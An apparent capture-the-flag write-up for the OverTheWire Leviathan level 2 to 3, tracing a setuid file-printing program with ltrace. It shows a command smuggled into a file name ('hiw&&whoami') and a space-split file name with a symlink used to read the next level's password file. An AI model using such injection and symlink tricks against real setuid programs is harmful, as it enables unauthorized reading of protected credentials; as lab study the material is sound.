# Leviathan 2 -> 3

```bash
ssh leviathan2@leviathan.labs.overthewire.org
```

```bash
$ ls -la
...
-r-sr-x---   1 leviathan3 leviathan2 7498 Nov 14  2014 printfile
...
```

Let's see what it does

```bash
$ ./printfile
*** File Printer ***
Usage: ./printfile filename
```

Let's try again

```bash
$ cd `mktemp -d`
$ echo hellow > hiw
$ ~/printfile hiw
/bin/cat: hiw: Permission denied
```

Now with `ltrace`

```bash
$ ltrace ~/printfile hiw
__libc_start_main(0x804852d, 2, 0xffffd654, 0x8048600 <unfinished ...>
access("hiw", 4) = 0
snprintf("/bin/cat hiw", 511, "/bin/cat %s", "hiw") = 12
system("/bin/cat hiw"hellow
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```

Things we found:

* It uses `access` to know if the file perms
* Then will use `cat` to read it.

Since `printfile` is owned by `leviathan3`, the `system` call should be made using `leviathan3`, unless we use `ltrace` right?


```bash
$ ltrace ~/printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852d, 2, 0xffffd654, 0x8048600 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4) = -1
puts("You cant have that file..."You cant have that file...
) = 27
+++ exited (status 1) +++
$ ln -s /etc/leviathan_pass/leviathan3
$ ~/printfile leviathan3
You cant have that file...
```

...

```bash
$ ls -l
total 4
-rw-rw-r-- 1 leviathan2 leviathan2  7 Oct  4 03:20 hiw
lrwxrwxrwx 1 leviathan2 leviathan2 30 Oct  4 03:25 leviathan3 -> /etc/leviathan_pass/leviathan3
```

But `ltrace ~/printfile hiw` worked, so let's try something

```bash
$ echo 123 > "hiw&&whoami"
$ ltrace ~/printfile "hiw&&whoami"
__libc_start_main(0x804852d, 2, 0xffffd664, 0x8048600 <unfinished ...>
access("hiw&&whoami", 4) = 0
snprintf("/bin/cat hiw&&whoami", 511, "/bin/cat %s", "hiw&&whoami") = 20
system("/bin/cat hiw&&whoami"hellow
leviathan2
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++
```

Good ! it worked !

```
system("/bin/cat hiw&&whoami"hellow
leviathan2
```

```bash
$ echo hah > "hiw leviathan3"
$ ~/printfile "hiw leviathan3"
/bin/cat: hiw: Permission denied
/bin/cat: leviathan3: Permission denied
```

It evaluated the file perms of "hiw leviathan3" which went OK and tried to read it as two files. Yet still, won't read the file `leviathan3`.  
It got me thinking and after a while I remember I was in my temp directory, let's try again directly in `/tmp/` (which is not owned by `leviathan2`).

```bash
$ echo hellow > /tmp/hiw
$ ln -s /etc/leviathan_pass/leviathan3 /tmp/leviathan3
$ touch "/tmp/hiw leviathan3"
$ ~/printfile "hiw leviathan3"
```

Success !


* ltrace
* mktemp
* ln
* access
* system
* cat
